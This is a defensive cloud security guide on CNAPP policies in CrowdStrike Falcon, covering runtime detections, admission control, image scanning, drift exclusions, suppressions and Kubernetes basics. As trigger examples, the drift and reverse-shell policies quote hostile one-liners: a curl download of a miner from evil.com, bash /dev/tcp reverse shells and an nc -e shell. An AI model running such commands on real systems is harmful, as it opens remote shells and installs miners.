---
title: "Comprehensive CNAPP Guide"
date: "2026-05-24"
category: "Cloud_Security_Guides"
---

# Comprehensive CNAPP Guide

## CNAPP Policy Examples

# 🛡️ CNAPP Rules & Policies — Practical Examples (2-3 Per Category)

> **Purpose:** Understand exactly what policies look like, what they do, and how you
> configure them in CrowdStrike Falcon / Wiz / Prisma Cloud.

---

# 1. INDICATORS OF ATTACK (IOA) POLICIES

> **What:** Behavioral detection rules that fire when a workload does something suspicious at runtime.
> **Your job:** Enable the right rules, set severity, and tune them to reduce noise.

### Policy 1: Container Drift Detection — CRITICAL

```
POLICY NAME:        Container Drift – Block New Executables
ASSIGNED TO:        Host Group: "All Production EKS Clusters"
ACTION:             DETECT + PREVENT (kills the new process)

WHAT IT DOES:
├── Monitors every running container for NEW binaries that were NOT
│   in the original container image
├── If a process that didn't exist at container start is executed → ALERT
├── If PREVENT is enabled → Falcon kills the process immediately

EXAMPLE TRIGGER:
├── Container starts with nginx:1.25 image
├── Attacker runs: curl http://evil.com/miner -o /tmp/xmrig && chmod +x /tmp/xmrig
├── /tmp/xmrig was NOT in the original image → DRIFT DETECTED
├── Falcon kills xmrig process before it runs
└── Alert: "ContainerDrift.NewExecutable" — Severity: CRITICAL

CONFIGURATION STEPS:
1. Cloud Security → Rules and Policies → Policies → IOA Policies
2. Select or create policy group: "Production Runtime"
3. Enable rule: "Container Drift – Executable"
4. Set action: Detect + Prevent
5. Assign to Host Group: "prod-eks-nodes"

EXCLUSIONS (if needed):
├── Some Java apps download plugins at startup → add exclusion:
│   Image: *java-dynamic-loader*
│   Path: /opt/plugins/*.jar
│   Justification: "App dynamically loads JAR plugins at startup"
│   Expiry: 90 days
│   Reviewer: security-team@company.com
```

### Policy 2: Reverse Shell Detection — CRITICAL

```
POLICY NAME:        Reverse Shell Detection – All Environments
ASSIGNED TO:        Host Group: "All Kubernetes Nodes"
ACTION:             DETECT + PREVENT

WHAT IT DOES:
├── Detects outbound shell connections (bash/sh/zsh)
│   connecting to external IPs on common C2 ports
├── Recognizes patterns:
│   ├── bash -i >& /dev/tcp/attacker-ip/4444 0>&1
│   ├── python -c 'import socket; ...'
│   ├── nc -e /bin/sh attacker-ip 4444
│   └── socat connection to external IP with shell
├── PREVENT mode: terminates the process

EXAMPLE TRIGGER:
├── Attacker exploits Java RCE (Log4Shell-like)
├── Runs: /bin/bash -i >& /dev/tcp/45.33.xx.xx/9001 0>&1
├── Falcon detects: known reverse shell pattern + external destination
├── Process killed, alert fired
└── Alert: "ReverseShellDetected" — Severity: CRITICAL

WHY ALWAYS PREVENT:
├── Reverse shells are 99% true positive
├── There is NO legitimate business reason for a production container
│   to open an outbound interactive shell to a random IP
└── Even if somehow FP — the cost of blocking is zero vs the cost
    of allowing is catastrophic
```

### Policy 3: Interactive Container Session — HIGH (Alert Only)

```
POLICY NAME:        Interactive Shell in Production Containers
ASSIGNED TO:        Host Group: "Production Nodes Only"
ACTION:             DETECT ONLY (alert, do not block)

WHAT IT DOES:
├── Detects when a TTY (interactive terminal) is opened inside
│   a running production container
├── Triggered by: kubectl exec -it, docker exec -it, or ECS Exec
├── Does NOT block — because authorized debugging sometimes requires this

EXAMPLE TRIGGER:
├── Engineer runs: kubectl exec -it api-pod-xyz -n payments -- /bin/bash
├── Falcon detects: TTY allocated inside production container
├── Alert: "InteractiveContainerSession" — Severity: HIGH
└── Security team reviews: Was this authorized? During change window?

WHY ALERT-ONLY (NOT PREVENT):
├── Sometimes on-call engineers need to debug production issues
├── But every exec should be logged, reviewed, and justified
├── If unauthorized → investigate as potential compromise
├── Pair with: K8s audit log (who ran the exec command, from which IP)

TUNING:
├── Suppress for: falcon-system namespace (sensor maintenance)
├── Suppress for: monitoring namespace (Prometheus debugging tools)
├── Do NOT suppress for: payments, customer-data, or PII namespaces
```

---

# 2. ADMISSION CONTROL (KAC) POLICIES

> **What:** Policies that intercept pod creation and BLOCK non-compliant deployments.
> **Your job:** Create rules, assign to clusters, start in Alert mode, graduate to Prevent.

### Policy 1: Block Privileged Containers

```
POLICY NAME:        Deny Privileged Containers
ASSIGNED TO:        Cluster Group: "All Production Clusters"
SCOPE:              All namespaces EXCEPT: kube-system, falcon-system, monitoring

RULE CONFIGURATION:
├── Type: IOM Rule (Indicator of Misconfiguration)
├── Check: Container securityContext.privileged == true
├── Action: PREVENT (block the deployment)
├── Message to developer:
│   "❌ Deployment rejected: privileged containers are not allowed in
│    production. Remove 'privileged: true' from your pod spec.
│    If you need specific kernel access, use 'capabilities.add'
│    with only the required capability (e.g., NET_ADMIN).
│    Exception process: submit request at security-portal/exceptions"

WHAT HAPPENS WHEN TRIGGERED:
├── Developer runs: kubectl apply -f deployment.yaml
│   (deployment has privileged: true)
├── KAC webhook intercepts the request
├── Evaluates against this policy → VIOLATION
├── Returns error to kubectl:
│   "Error from server: admission webhook 'kac.crowdstrike.com' denied
│    the request: privileged containers are not allowed [Policy: Deny-Priv]"
├── Pod is NOT created
└── Event logged in Falcon console: IOMs → Admission Control Events

EXCEPTIONS:
├── falcon-system namespace → Falcon sensor needs privileged (allowed)
├── kube-system namespace → CNI plugins may need privileged (allowed)
├── Everything else → BLOCKED
└── If a team needs an exception → formal review + time-limited bypass
```

### Policy 2: Block Unscanned Images

```
POLICY NAME:        Require Image Assessment Before Deploy
ASSIGNED TO:        Cluster Group: "All Clusters (Prod + Staging)"
SCOPE:              All namespaces except: kube-system

RULE CONFIGURATION:
├── Type: Image Assessment Rule
├── Check: Has this image been scanned by Falcon?
├── Criteria:
│   ├── Image must have a completed scan (not pending)
│   ├── Image must NOT have any Critical CVEs
│   ├── Image must NOT contain detected malware
│   └── Image must be from an approved registry (ECR only, not Docker Hub)
├── Action: PREVENT
├── Message:
│   "❌ Deployment rejected: image 'nginx:latest' has not been scanned
│    or contains Critical vulnerabilities.
│    Push your image to ECR (123456.dkr.ecr.us-east-1.amazonaws.com)
│    and wait for scan completion before deploying."

WHAT HAPPENS WHEN TRIGGERED:
├── Developer deploys with image: docker.io/library/nginx:latest
├── KAC checks: Is this image in Falcon's scan database?
│   → NO (public Docker Hub image, not scanned)
├── KAC blocks deployment
├── Developer must:
│   1. Pull image locally
│   2. Push to private ECR
│   3. ECR triggers Falcon scan automatically
│   4. Wait for scan to complete (2-5 minutes)
│   5. If no Critical CVEs → deploy using ECR image URI
│   6. If Critical CVEs → fix first, then deploy
```

### Policy 3: Enforce Security Context Requirements

```
POLICY NAME:        Enforce Pod Security Baseline
ASSIGNED TO:        Cluster Group: "All Production Clusters"
SCOPE:              All namespaces except: kube-system, falcon-system
MODE:               Week 1-2: ALERT → Week 3+: PREVENT

RULES (multiple checks in one policy):
├── Rule A: runAsNonRoot must be true
│   ├── Check: securityContext.runAsNonRoot == true
│   └── Message: "Containers must not run as root. Set runAsNonRoot: true"
│
├── Rule B: readOnlyRootFilesystem must be true
│   ├── Check: securityContext.readOnlyRootFilesystem == true
│   └── Message: "Root filesystem must be read-only. Use emptyDir for writes"
│
├── Rule C: capabilities must drop ALL
│   ├── Check: securityContext.capabilities.drop contains "ALL"
│   └── Message: "Drop all capabilities. Add back only what you need"
│
├── Rule D: hostNetwork must be false
│   ├── Check: spec.hostNetwork != true
│   └── Message: "hostNetwork is not allowed. Use Services for networking"
│
└── Rule E: hostPID must be false
    ├── Check: spec.hostPID != true
    └── Message: "hostPID is not allowed. Only system components may use this"

ROLLOUT STRATEGY:
├── Week 1: Deploy in ALERT mode
│   └── See how many existing deployments would be blocked
├── Week 2: Work with teams to fix their manifests
│   └── Provide them the exact YAML changes needed
├── Week 3: Switch Rules A,D,E to PREVENT (most critical)
├── Week 4: Switch Rules B,C to PREVENT
└── Ongoing: Monitor for exceptions, review quarterly
```

---

# 3. IMAGE ASSESSMENT POLICIES

> **What:** Rules that define what makes a container image "pass" or "fail" scanning.
> **Your job:** Set thresholds that balance security with operational reality.

### Policy 1: Production Image Standards

```
POLICY NAME:        Production Image Security Standards
APPLIED TO:         Registry: 123456.dkr.ecr.us-east-1.amazonaws.com
SCAN TRIGGER:       On every image push to ECR

THRESHOLDS:
├── FAIL (Block deployment via KAC):
│   ├── Any Critical CVE with a fix available
│   ├── Any malware detected
│   ├── Any hardcoded secret/credential in image layers
│   └── Image older than 90 days since last rebuild
│
├── WARN (Alert but allow):
│   ├── High CVEs (up to 5 allowed, must have remediation plan)
│   ├── Dockerfile best practice violations:
│   │   ├── Running as root (no USER instruction)
│   │   ├── Using :latest tag
│   │   └── No HEALTHCHECK defined
│   └── Medium/Low CVEs (for tracking, not blocking)
│
└── PASS:
    └── Zero Critical CVEs, zero malware, zero secrets

EXAMPLE SCAN RESULT:
┌────────────────────────────────────────────┐
│ IMAGE: app-api:v2.3.1                       │
│ REGISTRY: 123456.dkr.ecr.us-east-1         │
│ SCANNED: 2025-03-15 06:00 UTC               │
│                                              │
│ CRITICAL: 1 (CVE-2024-21626 - runc escape)  │
│ HIGH:     3                                  │
│ MEDIUM:   8                                  │
│ LOW:      12                                 │
│ MALWARE:  0                                  │
│ SECRETS:  0                                  │
│                                              │
│ VERDICT: ❌ FAIL                             │
│ REASON: Critical CVE with fix available      │
│ FIX: Update runc to >= 1.1.12               │
└────────────────────────────────────────────┘
```

### Policy 2: Development/Staging Relaxed Standards

```
POLICY NAME:        Dev/Staging Image Standards
APPLIED TO:         Registry: 123456.dkr.ecr.us-east-1.amazonaws.com/dev/*
SCAN TRIGGER:       On push

THRESHOLDS:
├── FAIL:
│   ├── Malware detected (no exceptions for malware, ever)
│   ├── Hardcoded AWS access keys or passwords
│   └── Known exploit kit signatures
│
├── WARN:
│   ├── Critical CVEs (warn but don't block — devs need to iterate)
│   ├── High CVEs
│   └── Dockerfile violations
│
└── PASS:
    └── Everything else

WHY RELAXED:
├── Dev environments need faster iteration
├── Blocking every Critical CVE in dev slows development
├── BUT: malware and secrets are NEVER acceptable — even in dev
└── Policy ensures: devs are AWARE of vulns but not blocked from coding
```

---

# 4. CONTAINER DRIFT EXCLUSIONS

> **What:** Exceptions for legitimate post-start file writes that trigger drift alerts.
> **Your job:** Create narrow exclusions with documentation, expiry, and review.

### Exclusion 1: Java Application — Dynamic JAR Loading

```
EXCLUSION NAME:     Java Plugin Loader – Dynamic JARs
SCOPE:
├── Image: 123456.dkr.ecr.*/java-service:*
├── Namespace: backend
├── Path: /opt/app/plugins/*.jar
JUSTIFICATION:
│   "The java-service application uses a plugin architecture that
│    downloads configuration JAR files from S3 at startup. These
│    JARs are not in the original image but are legitimate application
│    behavior. Verified with AppDev team lead (Jane Smith) on 2025-01-15."
EXPIRY:             2025-04-15 (90 days)
REVIEWER:           security-analyst@company.com
NEXT REVIEW:        2025-04-01

⚠️ RISK NOTES:
├── This exclusion only covers .jar files in /opt/app/plugins/
├── Any executable (.sh, .py, .elf) in this path is NOT excluded
├── Any drift OUTSIDE this path is NOT excluded
└── If the app architecture changes, this exclusion must be re-evaluated
```

### Exclusion 2: Log Rotation Agent — Creates New Log Files

```
EXCLUSION NAME:     Fluentd Log Rotation Files
SCOPE:
├── Image: fluent/fluentd:v1.16*
├── Namespace: logging
├── Path: /var/log/fluentd/buffer/*
JUSTIFICATION:
│   "Fluentd creates buffer files in /var/log/fluentd/buffer/ as part
│    of normal log forwarding. These files are written post-start and
│    trigger drift alerts. This is expected for any log aggregation sidecar."
EXPIRY:             2025-06-15 (90 days)
REVIEWER:           platform-team@company.com

⚠️ RISK NOTES:
├── Only buffer files (*.log, *.buf) are excluded
├── Any EXECUTABLE in this path would still trigger an alert
└── If Fluentd is replaced with another log agent, remove this exclusion
```

### Exclusion 3: Temporary Build Artifacts in CI/CD Runner

```
EXCLUSION NAME:     GitLab Runner – Build Artifacts
SCOPE:
├── Image: gitlab/gitlab-runner:*
├── Namespace: ci-cd
├── Path: /builds/**
JUSTIFICATION:
│   "GitLab Runner containers clone repositories and build artifacts
│    inside /builds/. These are new files that trigger drift detection.
│    This is a fundamental part of CI/CD and must be excluded."
EXPIRY:             2025-05-01 (90 days)
REVIEWER:           devops-lead@company.com

⚠️ RISK NOTES:
├── CI/CD runners are high-value targets for supply chain attacks
├── Even with this exclusion, REVERSE SHELL and CRYPTO MINING
│   detections are NOT excluded (those are IOA, not drift)
├── Monitor CI/CD namespace with enhanced logging
└── Restrict runner to limited IAM role (no production S3/RDS access)
```

---

# 5. CLOUD RISKS / IOM RULES / IaC RULES

> **What:** Customize which cloud misconfigurations to check, their severity, and whether to enable/disable specific checks.

### Policy 1: Critical Cloud Risks — Financial Org

```
POLICY NAME:        Financial Org – Critical Cloud Risks
APPLIES TO:         All registered AWS/Azure/GCP accounts

CUSTOMIZED RULES (severity overrides):

│ DEFAULT RULE                          │ OUR CUSTOM SEVERITY │ WHY           │
│──────────────────────────────────────│────────────────────│──────────────│
│ S3 bucket is publicly accessible      │ 🔴 CRITICAL (was H) │ PCI/GLBA      │
│ RDS instance is publicly accessible   │ 🔴 CRITICAL (was H) │ SOX/PCI       │
│ Security Group allows 0.0.0.0/0 SSH   │ 🔴 CRITICAL          │ CIS 5.1       │
│ Root account has access keys          │ 🔴 CRITICAL          │ CIS 1.4       │
│ CloudTrail not enabled in all regions │ 🔴 CRITICAL (was M) │ NYDFS/SOX     │
│ IAM user without MFA                  │ 🔴 CRITICAL (was H) │ NYDFS mandate │
│ EBS volume unencrypted                │ 🟠 HIGH              │ PCI Req 3     │
│ S3 bucket without versioning          │ 🟡 MEDIUM            │ Best practice │
│ Tag compliance (missing "Owner" tag)  │ 🟡 MEDIUM            │ Governance    │

DISABLED RULES (not applicable to our environment):
├── "GCP Dataflow not using Customer-Managed Keys" → We don't use GCP Dataflow
├── "Azure DevOps variable groups not restricted" → We use GitHub, not ADO
└── Justification documented for every disabled rule
```

### Policy 2: IaC Scanning Rules — Terraform

```
POLICY NAME:        Terraform IaC Security Standards
APPLIES TO:         All CI/CD pipelines running Terraform
SCANNER:            Checkov / KICS / Falcon IaC

RULES ENFORCED (build-breaking):
├── CKV_AWS_145: "Ensure S3 bucket has server-side encryption"
│   → terraform plan shows: aws_s3_bucket without server_side_encryption
│   → Build FAILS with message:
│     "All S3 buckets must have SSE enabled. Add:
│      server_side_encryption_configuration { ... }"
│
├── CKV_AWS_24: "Ensure no SG allows ingress from 0.0.0.0/0 to port 22"
│   → terraform plan shows: aws_security_group_rule with cidr 0.0.0.0/0 port 22
│   → Build FAILS
│
├── CKV_AWS_18: "Ensure S3 bucket has access logging enabled"
│   → Build FAILS if logging not configured
│
├── CKV_K8S_1: "Ensure privileged containers are not used"
│   → Kubernetes manifests in the repo with privileged=true → FAIL

RULES AS WARNINGS (logged but don't break build):
├── CKV_AWS_79: "Ensure IMDSv2 is required" → WARN (migrating gradually)
├── CKV_AWS_130: "Ensure VPC subnets don't auto-assign public IPs" → WARN
└── CKV_K8S_8: "Ensure readOnlyRootFilesystem is true" → WARN

EXCEPTION HANDLING:
├── Developer adds inline skip: # checkov:skip=CKV_AWS_145: "Using SSE-S3 default"
├── Security team reviews skip justification in PR review
├── Unjustified skips are rejected in PR
└── All skips tracked in monthly compliance report
```

---

# 6. SUPPRESSION RULES

> **What:** Rules that silence KNOWN false positives so analysts don't waste time on noise.
> **Your job:** Create each with documentation, narrow scope, expiry, and reviewer.

### Suppression 1: Health Check Triggers Network Alert

```
SUPPRESSION NAME:     Health Check HTTP Connections – Prometheus
DETECTION SUPPRESSED: SuspiciousNetworkConnection
SCOPE:
├── Source Image: prom/prometheus:*
├── Source Namespace: monitoring
├── Destination: internal IPs only (10.0.0.0/8)
├── Destination Port: 9090, 9100, 8080
JUSTIFICATION:
│   "Prometheus scrapes /metrics endpoints on all pods every 15 seconds.
│    These outbound HTTP connections are legitimate monitoring traffic
│    and consistently trigger SuspiciousNetworkConnection alerts.
│    Scoped to internal IPs only — external connections are NOT suppressed."
CREATED:              2025-01-15
EXPIRY:               2025-04-15 (90 days)
REVIEWER:             security-analyst@company.com
QUARTERLY REVIEW:     2025-04-01

⚠️ SAFETY CHECKS:
├── Suppression does NOT cover external IP destinations
├── If Prometheus connects to a non-internal IP → alert FIRES normally
├── If Prometheus image is updated to a non-prom/* image → alert FIRES
└── Periodically verify: is Prometheus still deployed in this namespace?
```

### Suppression 2: CI/CD Runner Shell Spawning

```
SUPPRESSION NAME:     GitLab Runner – Expected Shell Execution
DETECTION SUPPRESSED: SuspiciousProcessExecution
SCOPE:
├── Image: gitlab/gitlab-runner:*
├── Namespace: ci-cd
├── Process: /bin/bash, /bin/sh
├── Parent Process: gitlab-runner
JUSTIFICATION:
│   "GitLab Runner's primary function is to execute build scripts,
│    which inherently involves spawning shell processes. The runner's
│    bash/sh execution is expected behavior. Suppression is scoped
│    to shells spawned only by the gitlab-runner parent process."
CREATED:              2025-02-01
EXPIRY:               2025-05-01 (90 days)
REVIEWER:             devops-lead@company.com

⚠️ SAFETY CHECKS:
├── OTHER detections (reverse shell, crypto mining, drift) are NOT suppressed
├── If the parent process is NOT gitlab-runner → alert fires normally
├── If shell is spawned in a DIFFERENT namespace → alert fires normally
└── CI/CD runners should have limited IAM — monitor for privilege escalation
```

### Suppression 3: Init Container DNS Resolution Burst

```
SUPPRESSION NAME:     Init Container DNS Burst – Vault Agent
DETECTION SUPPRESSED: SuspiciousDNSRequest (volume-based)
SCOPE:
├── Image: hashicorp/vault-agent:*
├── Namespace: *
├── Detection sub-type: "High volume DNS queries"
├── Destination: internal DNS (kube-dns, CoreDNS)
JUSTIFICATION:
│   "Vault Agent init containers resolve the Vault server address
│    repeatedly during startup (retry logic with exponential backoff).
│    This generates 50-100 DNS queries in 30 seconds, triggering
│    the 'High volume DNS' sub-detection. The queries are to internal
│    DNS only and resolve vault.vault-system.svc.cluster.local."
CREATED:              2025-02-15
EXPIRY:               2025-05-15 (90 days)
REVIEWER:             platform-engineering@company.com

⚠️ SAFETY CHECKS:
├── Only DNS tunneling pattern to EXTERNAL domains would be suppressed
│   (it is NOT — this only covers internal DNS volume)
├── If Vault Agent resolves an EXTERNAL domain → alert fires
└── If DNS query contains encoded data (tunneling) → alert fires
```

---

# 📋 POLICY GOVERNANCE CHECKLIST

```
MONTHLY:
☐ Review all active suppression rules (any expired?)
☐ Check KAC alert-mode policies: ready to upgrade to prevent?
☐ Review IOA detection rates: any rule with <50% TP rate?
☐ Count total suppression rules: is the number growing too fast?

QUARTERLY:
☐ All 90-day suppressions re-evaluated (renew, modify, or remove)
☐ All drift exclusions re-validated with application teams
☐ KAC policy coverage: are new clusters assigned to policies?
☐ IaC scanning: are new Terraform modules covered?
☐ Report to governance: total policies, suppressions, exceptions, trends

ANNUALLY:
☐ Full policy review with security leadership
☐ Align policies with latest CIS benchmark versions
☐ Update image assessment thresholds if industry standards changed
☐ Sunset deprecated rules for decommissioned applications
```


---

## CNAPP Structured Guide

# 🛡️ CrowdStrike Falcon Cloud Security (CNAPP) — Structured Reference Guide

> Restructured and deduplicated from the original CNAPP notes. Organized by concept hierarchy for interview preparation and operational reference.

---

## Table of Contents

1. [Cloud Security Fundamentals](#1-cloud-security-fundamentals)
2. [CNAPP Overview & Components](#2-cnapp-overview--components)
3. [Kubernetes Fundamentals](#3-kubernetes-fundamentals)
4. [Falcon Sensor Deployment](#4-falcon-sensor-deployment)
5. [Kubernetes Admission Controller (KAC)](#5-kubernetes-admission-controller-kac)
6. [Runtime Security & Container Protection](#6-runtime-security--container-protection)
7. [Container Lifecycle Monitoring](#7-container-lifecycle-monitoring)
8. [Prevention Policies & Drift Detection](#8-prevention-policies--drift-detection)
9. [Compliance, Governance & Automation](#9-compliance-governance--automation)
10. [Falcon Alert Investigation Checklist](#10-falcon-alert-investigation-checklist)
11. [Kubernetes Scenario-Based Questions](#11-kubernetes-scenario-based-questions)
12. [Kubernetes Admission Process Deep Dive](#12-kubernetes-admission-process-deep-dive)

---

## 1. Cloud Security Fundamentals

### Shared Responsibility Model
- **Cloud Service Provider (CSP):** Security **"of"** the cloud (physical infrastructure, hypervisor, network fabric).
- **Customer:** Security **"in"** the cloud (data, IAM, OS patching, application security, network configuration).

### Top Cloud Security Challenges

| Challenge | Description |
|-----------|-------------|
| **Data Breaches** | Sensitive data exposed due to misconfigured storage, weak access controls, or insider threats |
| **Misconfigured Cloud Settings** | Publicly accessible storage, unrestricted permissions — the most common cause of breaches |
| **Unauthorized Access** | Weak authentication or shared credentials allow attackers into cloud resources |
| **Insecure APIs** | APIs without proper authentication and validation can be exploited as a gateway |
| **Compliance Violations** | Storing/processing sensitive data without meeting GDPR, HIPAA, PCI standards leads to fines |

### Best Practices for Cloud Security

1. **Use Multi-Factor Authentication (MFA)**
2. **Apply the Principle of Least Privilege**
3. **Encrypt Data in Transit and at Rest**
4. **Regularly Review IAM Roles & Policies**
5. **Enable Logging and Monitoring**
6. **Automate Security Scanning in CI/CD Pipelines**
7. **Secure API Endpoints** (authentication, HTTPS, input validation)
8. **Keep Software and OS Up-to-Date**

### DevSecOps
Development Security and Operations — integrating security continuously throughout the software development lifecycle. Builds on the agile framework by incorporating security within each phase of the IT process to minimize vulnerabilities and improve compliance without impacting release speed.

The CI/CD process is an agile, iterative approach that gets software into production quickly, unlike traditional waterfall which may take months or years.

---

## 2. CNAPP Overview & Components

### What is a CNAPP?
A **Cloud-Native Application Protection Platform** simplifies monitoring, detection, and reaction to potential cloud security threats and vulnerabilities. CNAPPs monitor the entire CI/CD application lifecycle, from development to production, and provide a centralized platform for managing security policies.

### CNAPP Component Tools

| Component | Falcon Mapping | Purpose |
|-----------|---------------|---------|
| **CWPP** (Cloud Workload Protection Platform) | Kubernetes & Containers in Falcon | Protects running workloads — runtime detection, container security |
| **CSPM** (Cloud Security Posture Management) | Cloud Posture section | Secures cloud APIs, prevents misconfigurations, CI/CD integration |
| **IaC Scanning** (Infrastructure-as-Code) | — | Scans Terraform/CloudFormation templates for misconfigurations before deployment |
| **KSPM** (Kubernetes Security Posture Management) | — | Monitors K8s environment, workloads, configurations, clusters to minimize errors |
| **CIEM** (Cloud Infrastructure Entitlement Management) | Cloud Identity Analyzer | Governs identity-related configurations and security (customer responsibility) |
| **ASPM** (Application Security Posture Management) | ASPM section | Evaluates and enhances security posture of custom applications |
| **DSPM** (Data Security Posture Management) | DSPM section | Identifies sensitive data (PII, credit card info) in cloud assets for prioritization |

### Falcon Cloud Security Platform Navigation

| Section | Purpose |
|---------|---------|
| **Monitor** | Maintain situational awareness, address critical issues |
| **Assets** | Governance and visibility on cloud, server, and container assets |
| **Asset Graph** | Find assets by attribute to prioritize and address risk |
| **Compliance** | Determine conformity with industry standards |
| **ASPM** | Visibility into security, privacy, and operational risk of production apps |
| **Cloud Posture** | Find and manage risky configurations, permissions, and behaviors |
| **Vulnerabilities** | Shift-left — fix issues in container images and serverless functions pre-production |
| **Detections** | Secure containerized workloads and cloud-native applications |
| **Policies and Settings** | Customize Falcon Cloud Security for your environment |

### Security & Compliance: Why They Matter

| Focus Area | Challenge | FCS Solution |
|------------|-----------|--------------|
| **Shift-Left Security** | Traditional tools detect vulnerabilities only after deployment → costly fixes | FCS integrates security earlier in CI/CD, catching risks before production |
| **Continuous Monitoring** | Misconfigurations in cloud workloads/APIs lead to breaches | Real-time visibility into risks across AWS, Azure, GCP |
| **Runtime Protection** | Many teams lack visibility into runtime threats after deployment | Detects container escapes, API vulnerabilities, IAM permission abuse |
| **Identity Security** | Over-permissioned IAM roles = leading cause of cloud breaches | Visibility into cloud identities, roles, permissions for least privilege enforcement |
| **Multi-Cloud Visibility** | Fragmented monitoring across AWS, Azure, GCP | Unified security platform eliminates dashboard-switching risk |

---

## 3. Kubernetes Fundamentals

### Core Components

| Component | Description |
|-----------|-------------|
| **Cluster** | A set of nodes that run containerized applications — the "engine" driving your apps |
| **Node (Worker Node)** | A machine that runs Pods and keeps the cluster working smoothly |
| **Pod** | Holds a logical grouping of one or more containers, sharing the Pod's resources (network, CPU). K8s manages Pods, not containers directly |
| **Container** | A self-contained unit of software consisting of the application, its libraries, and dependencies |
| **Container Runtime** | Software responsible for running containers (e.g., `containerd`, `CRI-O`, `runc`) |
| **Control Plane** | Collection of nodes managing the state of the cluster, sends instructions to workers via the API server |
| **API Server** | Allows different components of the cluster to interact with each other |

### Key Terminology

| Term | Definition |
|------|------------|
| **Host/Node** | The physical or virtual server running your containers |
| **Sidecar** | A helper container that runs alongside your application container in the same Pod |
| **Kernel** | The core of the operating system that manages system resources |
| **eBPF** | Extended Berkeley Packet Filter — allows programs to run in the kernel without loading kernel modules |
| **Privileged Container** | A container with elevated permissions to access host resources |
| **Security Context** | Defines and controls security settings and permissions for containers within Pods |
| **Namespace** | Organizes resources into logical groups, helps manage and isolate workloads |
| **DaemonSet** | Ensures a copy of a Pod runs on each (or selected) node in the cluster |

---

## 4. Falcon Sensor Deployment

### Sensor Options Comparison

| Feature | Falcon Sensor for Linux | Falcon Container Sensor for Linux |
|---------|------------------------|----------------------------------|
| **What it protects** | Linux hosts AND all containers on that host | Individual containers only (within a specific Pod) |
| **Where it runs** | Directly on the host server/node | Inside each Pod as a sidecar container |
| **Best for** | Environments where you control the host OS | Managed or serverless environments (e.g., AWS Fargate) where you can't access the host |

### Falcon Sensor for Linux — Deployment Modes

| Mode | Details |
|------|---------|
| **Standard (on host)** | Install directly on the host. Protects host + all containers |
| **DaemonSet — User Mode** | Default for sensor 7.18+. Uses eBPF technology. No kernel module needed |
| **DaemonSet — Kernel Mode** | Deepest protection level. Observes all kernel activity. One privileged container per node |

### Falcon Container Sensor
- **Automatic sidecar injection** — injected into each Pod when scheduled to run
- Runs inside each Pod alongside other containers
- Requires no privileges

### Decision Flowchart: Which Sensor to Deploy

| Question | Yes → Use | No → |
|----------|-----------|------|
| Running Kubernetes? | DaemonSet | Go to Q2 |
| Control the underlying hosts/OS/cluster? | Falcon Sensor for Linux (on host) | Go to Q3 |
| OS and kernel supported by Falcon sensor? | Falcon Sensor for Linux | Falcon Container Sensor |

> **Best Practice:** Always use the Falcon Sensor for Linux when possible for maximum protection. Use the Container Sensor when host access isn't available.

### Installation Methods

| Method | Falcon Helm Chart | Falcon Operator |
|--------|-------------------|-----------------|
| **What it is** | Package manager for K8s (like apt/yum) | K8s-native application extending K8s functionality |
| **Purpose** | Simplifies deployment and management | Automates complex, app-specific operational tasks |
| **How it works** | Uses templated YAML "charts", one-time deployments, manages releases/rollbacks | Uses CRDs, continuously monitors and reconciles state, encodes operational knowledge |
| **Best for** | Stateless apps, simple deployments, initial setup | Stateful apps (databases), complex lifecycle management, domain-specific automation |

### Unified Installation
The Falcon Platform unified Helm chart deploys **all three components** (Sensor, KAC, Image Analyzer) with a single command:
1. Set global variables (Customer ID, pull token)
2. Pull images using the CrowdStrike pull script
3. Deploy all namespaces and components together

### Verification
Run `kubectl get pods` to confirm each component is installed and running.

---

## 5. Kubernetes Admission Controller (KAC)

### What is KAC?
The Falcon KAC is a **plugin deployed to your Kubernetes cluster** to provide visibility and identify misconfigurations. It monitors, alerts, and blocks Kubernetes objects when they are created or updated.

### KAC Architecture — Three Containers in One Pod

| Container | Name | Role |
|-----------|------|------|
| **Kubernetes Client** | `falcon-client` | Validating webhook — listens to K8s API server events and forwards them to the admission controller |
| **Admission Controller** | `falcon-ac` | Policy management, cloud communication, and event handling — talks directly with CrowdStrike cloud |
| **Watcher** | `falcon-watcher` | Takes snapshots of K8s objects, continuously monitors them. Streams create/update/delete events as `K8SResource` events to CrowdStrike cloud |

### How KAC Enforces Policies
1. KAC compares K8s objects against **Admission Control Policies** and **Image Assessment Policies** in the Falcon platform
2. Dynamic policy updates are immediately reflected in KAC decisions
3. Actions per misconfiguration: **Disabled** / **Alert** / **Prevent**
4. When Image Assessment is enabled, KAC also takes action on images with risks/vulnerabilities, **blocking them before containers can start**

### KAC Policy Configuration

**Navigate to:** `Cloud Security > Rules and Policies > Policies > Admission Control Policies`

**Key policy components:**
- **Rule Groups** — define which K8s resources the policy applies to
- **Host Groups** — connect the policy to the admission controller
- **Namespaces** — target specific virtual clusters
- **Pod/Service Labels** — precise targeting of workloads
- **IOM Rules** — set to Disabled, Alert, or Prevent
- **Image Assessment Settings** — enable KAC to act on image assessment policies

**Example KAC Policy:**
- Set `Privileged container`, `Containers running as root`, `Host network access` → **Prevent**
- Set remaining IOMs → **Alert**
- Enable Image Assessment in Admission Controller
- Set unassessed images to **Prevent**
- Enable Failure policy to block workloads with unrecognized errors
- Assign to a dynamic host group filtered by: K8s Cluster ID, Server Version, Git Version

---

## 6. Runtime Security & Container Protection

### Why Runtime Security Matters
Containers are not just at risk during build or deployment — **the real battle happens at runtime**.

**Runtime threats include:**
- **Unassessed Images** — images not scanned for risks
- **Rogue Containers** — launched outside K8s orchestrator control, not part of an image registry
- **Container Drift** — container deviates from its original configuration or intended behavior
- **Interactive Intrusion** — activity mimicking expected user/admin behavior, making it hard to distinguish from cyberattacks

**Attacker techniques at runtime:**
- Exploit weak authentication
- Deploy malware
- Use cloud management tools for lateral movement
- Maintain persistence through alternate authentication mechanisms
- Evade detection through indicator removal and security control bypass

### Falcon Runtime Protection Components
1. **Kubernetes Admission Controller (KAC)** — pre-deployment blocking
2. **Falcon Sensor for Linux** — host-level runtime monitoring
3. **Falcon Container Sensor** — pod-level runtime monitoring
4. **Image Assessment at Runtime (IAR)** — scans running images for vulnerabilities

### Key Runtime Detections

| Detection | Description |
|-----------|-------------|
| `PotentialKernelTampering` | eBPF invoked from within a container — highly unusual, can load kernel rootkits or manipulate kernel behavior |
| `SetUIDBitFoundInImage` | SetUID bit found in image — privilege escalation risk |
| `RunningAsRootContainer` | Container running as root — full system privileges |
| `ADDInstructionInDockerfile` | ADD instruction in Dockerfile — potential for injecting malicious content |
| `UserInstructionNotInDockerfile` | No USER instruction — runs as root by default |
